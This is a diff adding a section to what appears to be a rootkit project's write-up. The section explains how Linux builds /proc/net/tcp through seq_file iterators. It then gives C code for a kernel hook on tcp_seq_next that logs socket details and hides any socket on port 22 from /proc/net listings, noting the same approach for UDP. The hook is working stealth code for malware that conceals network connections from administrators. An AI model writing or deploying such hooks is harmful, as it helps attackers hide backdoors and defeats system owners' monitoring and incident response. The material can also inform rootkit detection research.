@@ -63,4 +63,144 @@ may or may not be required.
 
 ### `/proc/net/*` Implementation
 
-# UNFINISHED
+My intent was to find some function where, as in the previous section, we could sit "inline" and filter
+existing sockets from appearing in the output of `/proc/net/*`. Of course, each file in `/proc/net` has
+a different implementation of read operations.
+
+Browsing around `/fs/proc/proc_net.c` in the kernel source, I found the exported symbol `proc_create_net_data`,
+and some of it's brothers and sisters with slightly different names - these are used by the kernel or by external
+modules to define new psuedo-files under `/proc/net`!
+
+The one for `/proc/net/tcp` is defined in `/net/ipv4/tcp_ipv4.c`:
+
+```C
+static int __net_init tcp4_proc_init_net(struct net *net)
+{
+    if (!proc_create_net_data("tcp", 0444, net->proc_net, &tcp4_seq_ops,
+            sizeof(struct tcp_iter_state), &tcp4_seq_afinfo))
+        return -ENOMEM;
+    return 0;
+}
+```
+
+The operations, which according to [this](https://docs.kernel.org/filesystems/seq_file.html) nice document explaining
+the `seq_file` interface, are used to initialize and use an iterator. Good!
+
+The function which returns the next element in the iterator is `tcp_seq_next`, and it's even exported:
+
+```C
+void *tcp_seq_next(struct seq_file *seq, void *v, loff_t *pos)
+{
+    struct tcp_iter_state *st = seq->private;
+    void *rc = NULL;
+
+    if (v == SEQ_START_TOKEN) {
+        rc = tcp_get_idx(seq, 0);
+        goto out;
+    }
+
+    switch (st->state) {
+    case TCP_SEQ_STATE_LISTENING:
+        rc = listening_get_next(seq, v);
+        if (!rc) {
+            st->state = TCP_SEQ_STATE_ESTABLISHED;
+            st->bucket = 0;
+            st->offset = 0;
+            rc = established_get_first(seq);
+        }
+        break;
+    case TCP_SEQ_STATE_ESTABLISHED:
+        rc = established_get_next(seq, v);
+        break;
+    }
+out:
+    ++*pos;
+    st->last_pos = *pos;
+    return rc;
+}
+EXPORT_SYMBOL(tcp_seq_next);
+```
+
+It's understandable that `rc` in some way represents the TCP socket information as it's what the function yields,
+but what is it really?
+
+Well, we can just take a look at the called functions `listening_get_next` and `established_get_next` and see how they
+construct this value. Lo and behold, it's a `struct sock`! This struct contains everything we need to base our hide filter on.
+
+So now remains just constructing the hook logic to implement within the function.
+
+## Hooking `tcp_seq_next` (And `seq_file.op.next` Methods In General)
+
+No need to get sleezy, we can do something cheezy like this:
+
+```C
+void *tcp_seq_next_hook(struct seq_file *seq, void *v, loff_t *pos)
+{   
+    /* original tcp_seq_next_hook code */
+
+    struct tcp_iter_state *st = seq->private;
+    void *rc = NULL;
+
+    if (v == SEQ_START_TOKEN) {
+        rc = ksyms__tcp_get_idx(seq, 0);
+        goto out;
+    }
+
+    switch (st->state) {
+    case TCP_SEQ_STATE_LISTENING:
+        rc = ksyms__listening_get_next(seq, v);
+        if (!rc) {
+            st->state = TCP_SEQ_STATE_ESTABLISHED;
+            st->bucket = 0;
+            st->offset = 0;
+            rc	  = ksyms__established_get_first(seq);
+        }
+        break;
+    case TCP_SEQ_STATE_ESTABLISHED:
+        rc = ksyms__established_get_next(seq, v);
+        break;
+    }
+out:
+    ++*pos;
+    st->last_pos = *pos;
+
+    /* hook code */
+
+    if (rc) {
+        printk(KERN_INFO "==== SOCKET ====");
+        printk(KERN_INFO "sk_prot: %s", ((struct sock *)rc)->sk_prot->name);
+        printk(KERN_INFO "sk_daddr: %x", ((struct sock *)rc)->sk_daddr);
+        printk(KERN_INFO "sk_rcv_saddr: %x", ((struct sock *)rc)->sk_rcv_saddr);
+        printk(KERN_INFO "sk_dport: %d", ((struct sock *)rc)->sk_dport);
+        printk(KERN_INFO "sk_num: %d", ((struct sock *)rc)->sk_num);
+
+        if (((struct sock *)rc)->sk_num == 22) {
+            printk(KERN_INFO "hiding socket!");
+            return seq->op->next(seq, rc, pos);
+        }
+    }
+
+    /* original tcp_seq_next_hook code */
+
+    return rc;
+}
+```
+
+At the end of the function, before yielding the `struct sock`, we can implement our filters;
+and to actually hide a socket, we need only to call the `next` method (which is actually just our hook function
+again) with a twist; `rc` is not just a `struct sock`! It is also used as some sort of position descriptor or whatnot.
+
+We can see this in action in `fs/seq_file.c`, in `traverse` - which actually uses the `next` method to iterate:
+
+```C
+static int traverse(struct seq_file *m, loff_t offset) {
+    // ...
+    p = m->op->next(m, p, &m->index);
+    // ...
+}
+```
+
+The **return value** is used as the `v` argument.
+So we replicate just that as done above, and we can successfully hide TCP sockets (IPv4 & IPv6!) :D
+
+We'll repeat the same process for UDP sockets, see the full implementation in [src/hide/proc_net.c](../src/hide/proc_net.c).
